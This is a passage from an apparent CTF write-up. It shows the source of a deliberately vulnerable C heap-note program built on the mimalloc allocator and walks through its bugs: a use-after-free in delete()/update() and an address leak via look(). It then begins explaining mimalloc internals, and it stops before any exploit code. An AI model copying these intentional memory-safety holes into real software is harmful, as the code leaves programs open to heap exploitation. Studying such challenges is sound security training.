</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define NOTE_COUNT 16
</span></span></span><span class="line"><span class="cl"><span class="cp">#define NOTE_SIZE  128
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span> <span class="n">notes</span> <span class="p">[</span><span class="n">NOTE_COUNT</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define INTRO &#34;\
</span></span></span><span class="line"><span class="cl"><span class="cp">###################################\n\
</span></span></span><span class="line"><span class="cl"><span class="cp"># Yet Another Heap Note Challenge #\n\
</span></span></span><span class="line"><span class="cl"><span class="cp">###################################\n\
</span></span></span><span class="line"><span class="cl"><span class="cp">    What Would You Like to Do:     \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        1. Create a Note           \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        2. Delete a Note           \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        3. Read a Note             \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        4. Update a Note           \n\
</span></span></span><span class="line"><span class="cl"><span class="cp">        5. Exit                    \n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMT &#34;YAHNC&gt; &#34;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The code above sets up the basic framework for a heap-based note-taking program. It defines four key functions:</p>
<ul>
<li><code>create()</code> — used to allocate and create new notes.</li>
<li><code>update()</code> — likely used to edit or update the content of an existing note.</li>
<li><code>look()</code> — used to display (or read) the contents of a note.</li>
<li><code>delete()</code> — used to delete (i.e., free) an allocated note.</li>
</ul>
<p>There’s a <code>notes</code> array defined with a fixed size (<code>NOTE_COUNT = 16</code>) where each entry can point to a note of size <code>NOTE_SIZE = 128</code>. The interface is menu-driven and offers options for each of the operations listed above.</p>
<h3 class="heading-element" id="main-function"><span>Main Function</span>
  <a href="#main-function" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">INTRO</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="n">PMT</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34; %u&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">option</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid Input.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">option</span> <span class="o">&gt;=</span> <span class="mi">6</span> <span class="o">||</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid Range.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">switch</span><span class="p">(</span><span class="n">option</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> 
</span></span><span class="line"><span class="cl">                <span class="nf">create</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">2</span><span class="o">:</span> 
</span></span><span class="line"><span class="cl">                <span class="nf">delete</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">look</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">update</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">get_index</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Position? (0-15): &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34; %u&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">number</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid Input.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">number</span> <span class="o">&gt;=</span> <span class="mi">16</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid Range.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">number</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">create</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">notes</span><span class="p">[</span><span class="n">number</span><span class="p">]</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">look</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="n">notes</span><span class="p">[</span><span class="n">number</span><span class="p">],</span> <span class="n">NOTE_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">delete</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">   <span class="nf">free</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">number</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">   <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">update</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="nf">get_index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Content? (127 max): &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">notes</span><span class="p">[</span><span class="n">number</span><span class="p">],</span> <span class="n">NOTE_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>main()</code> function does a few important things up front:</p>
<ul>
<li>It disables buffering for <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> using <code>setvbuf()</code>, which is pretty common in CTF challenges to make input/output immediate and predictable.</li>
<li>Then, it prints the menu and enters an infinite loop, waiting for the user to choose one of the options.</li>
</ul>
<p>Valid options are 1 through 5. Any invalid input or out-of-range value results in the program exiting immediately.</p>
<p>The available operations are:</p>
<hr>
<h3 class="heading-element" id="case-1-create"><span>Case 1: <code>create()</code></span>
  <a href="#case-1-create" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>This function:</p>
<ul>
<li>Prompts the user for an index between 0 and 15 (through <code>get_index()</code>).</li>
<li>Allocates a chunk of 128 bytes and stores its pointer in the <code>notes[]</code> array at that index.</li>
</ul>
<blockquote>
<p>No check is done to see if a note already exists at that index.This means we <strong>can call <code>create()</code> multiple times at the same index</strong>, creating infinte notes.</p></blockquote>
<hr>
<h3 class="heading-element" id="case-2-look"><span>Case 2: <code>look()</code></span>
  <a href="#case-2-look" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li>Takes an index (0–15) and prints the content of the note at that index using <code>write()</code> (not <code>printf</code>), up to <code>NOTE_SIZE - 1</code> bytes (i.e., 127 bytes).</li>
<li>It can potentionally be used to leak addresses.</li>
</ul>
<hr>
<h3 class="heading-element" id="case-3-delete"><span>Case 3: <code>delete()</code></span>
  <a href="#case-3-delete" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li>
<p>Frees the memory allocated at the specified index in the <code>notes[]</code> array.</p>
<blockquote>
<p><strong>Bad Programming alert:</strong> It doesn’t check if the chunk has already been freed, and it also doesn’t null out the pointer in the <code>notes</code> array. So yeah — <strong>Use-After-Free is definitely possible</strong>.</p></blockquote>
</li>
</ul>
<hr>
<h3 class="heading-element" id="case-4-update"><span>Case 4: <code>update()</code></span>
  <a href="#case-4-update" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li>
<p>Writes up to 127 bytes into the chunk pointed to by <code>notes[index]</code> using <code>read()</code>.</p>
<blockquote>
<p>It doesn’t check if the pointer is valid or already freed.Combined with the <code>delete()</code> bug,</p>
<p>this gives us a clean <strong>UAF</strong> — just free a chunk and still write to it with <code>update()</code> .</p></blockquote>
</li>
</ul>
<hr>
<p>The source code is full of bugs and just straight-up bad practices.</p>
<p>Honestly, after reading through it, I was like — <em>“Huuuh… this is a 10-minute solve, easy.”</em></p>
<p>But then out of curiosity, I checked the scoreboard to see how many people had solved it in the past 6 hours&hellip; and it showed <strong>only 2 solves</strong>.</p>
<p><em>WTH?! Only 2 solves after 6 hours?</em></p>
<img src="http://localhost:1313/d1ff/doremi/Source_Code.png" width="300" style="display: block; margin: auto;" />
<!-- ![source_Code.png](/d1ff/doremi/source_Code.png) -->
<p>Then I noticed one of the files was <code>libmimalloc.so.2.2</code> — and that’s when it clicked.</p>
<p>The challenge had a twist: it was using <strong>mimalloc</strong>, not the usual glibc heap. So yeah, we had something different to deal with.</p>
<h3 class="heading-element" id="other-challenge-info"><span>Other challenge Info</span>
  <a href="#other-challenge-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><img loading="lazy" src='http://localhost:1313/d1ff/doremi/4d75ca57-fc1c-4674-929c-bd10da0610ec.png' alt="image.png"></p>
<p>all <code>green</code> 🥲.</p>
<p><em><strong>file info</strong></em> :</p>
<p>chal:  <code>ELF 64-bit LSB pie executable</code>, x86-64, version 1 (SYSV), dynamically linked, interpreter <code>/lib/ld-musl-x86_64.so.1</code> ,BuildID[sha1]=d03b8a1569c45ed78a067b229eada20c723aec72, with debug_info, not stripped</p>
<blockquote>
<p>The <code>chal</code> is using <code>/lib/ld-musl-x86_64.so.1</code> as the main library for the process but uses <code>libmimalloc.so.2.2</code> as a replacement for memory related functions.</p></blockquote>
<hr>
<h2 class="heading-element" id="mimalloc"><span>Mimalloc</span>
  <a href="#mimalloc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><code>mimalloc</code> (short for <em>&ldquo;Microsoft malloc&rdquo;</em>) is a <strong>high-performance memory allocator</strong> developed by Microsoft. It&rsquo;s designed to be fast, scalable, and memory-efficient, and it can be used as a drop-in replacement for the standard <code>malloc</code>, <code>free</code> and other memory related functions.</p>
<h3 class="heading-element" id="setuplinking"><span>Setup/Linking</span>
  <a href="#setuplinking" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>The chal file was not running in my local machine at first. To setup and link the libraries provided, do the following :-</p>
<ol>
<li><code>sudo apt install musl</code></li>
<li>Obtain the <code>ld-musl-x86_64.so.1</code> from the <code>Dockerfile</code> provided and patch the chal file with the library using <code>pwninit or patchelf</code> .</li>
<li>dynamically override the default allocator using</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">LD_PRELOAD</span><span class="o">=</span>./libmimalloc.so.2.2 chal_patched</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, once you run the <code>chal</code> binary (with <code>libmimalloc.so</code> loaded), the <strong>virtual memory layout</strong> should look something like this:</p>
<p><img loading="lazy" src='http://localhost:1313/d1ff/doremi/image.png' alt="image.png"></p>
<h3 class="heading-element" id="but-how-does-mimalloc-make-allocations"><span>But How does Mimalloc make Allocations?</span>
  <a href="#but-how-does-mimalloc-make-allocations" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>When <code>malloc</code> is called in the code, the mimalloc implementation takes over instead of the standard <code>malloc</code>. Instead of using local Heap, Mimalloc creates a memory segment of roughly 4 MiB using <code>mmap</code>. Each segment is then split into multiple <em>mimalloc pages</em>, each around 64 KiB* in size. A key detail is that each page only handles fixed-size blocks (chunks) — for example, one page might only allocate 16-byte chunks, while another is dedicated to 32-byte chunks. It improves spatial locality of allocations hence increasing it’s performance.</p>
<p>The metadata for both segments and pages is stored right at the beginning of their respective memory regions, holding various pointers and information necessary for allocation, freeing, and internal working. One of the more interesting features of mimalloc is its <a href="https://www.microsoft.com/en-us/research/wp-content/uploads/2019/06/mimalloc-tr-v1.pdf"target="_blank" rel="external nofollow noopener noreferrer"><strong><code>free list sharding</code></strong></a> — breaking up free lists into different smaller lists which improves performance by reducing contention and cache-line conflicts when managing free memory blocks.</p>
<h3 class="heading-element" id="free-list-sharding"><span>Free list sharding</span>
  <a href="#free-list-sharding" class="heading-mark">
